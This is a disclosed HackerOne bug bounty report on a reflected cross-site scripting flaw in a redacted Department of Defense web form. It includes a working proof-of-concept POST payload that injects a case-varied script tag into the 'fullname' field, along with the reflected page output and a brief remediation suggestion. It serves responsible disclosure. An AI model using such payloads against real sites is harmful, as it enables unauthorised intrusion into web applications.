# reflected xss @ www.█████████

## Report Details
- **Report ID**: 225020
- **URL**: https://hackerone.com/reports/225020
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-04-29T22:21:24.983Z
- **Disclosed**: 2021-03-11T21:00:53.601Z

## Reporter
- **Username**: geeknik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
https://www.██████████/█████████is vulnerable to cross site scripting attacks.

**PoC**

Sending the following `POST` request to `/█████` triggers the xss:
```
%3d=%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3dTOP_OF_RECORD%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d&ATprogram=1&E=&fullname=nbfgkjaa'%22()%26%25<geeknik><ScRiPt%20>prompt(/XSS/)</ScRiPt>&glomf=1&glorf=1&numusers=xmkucffw&org=1&other=1&phone=555-666-0606&recType%21=-██████-&source=1&sponsorglomf=1&sponsorname=xmkucffw&sponsorphone=555-666-0606
```

This is reflected in the page source:
```
A request has successfully been entered for nbfgkjaa'"()&%<geeknik><ScRiPt >prompt(/XSS/)</ScRiPt>.</h3><h3>A confirmation email will shortly be sent to 1.</h3>
```

**Suggested Mitigation/Remediation Actions**
This script should filter metacharacters from user input.



## Attachments
No attachments
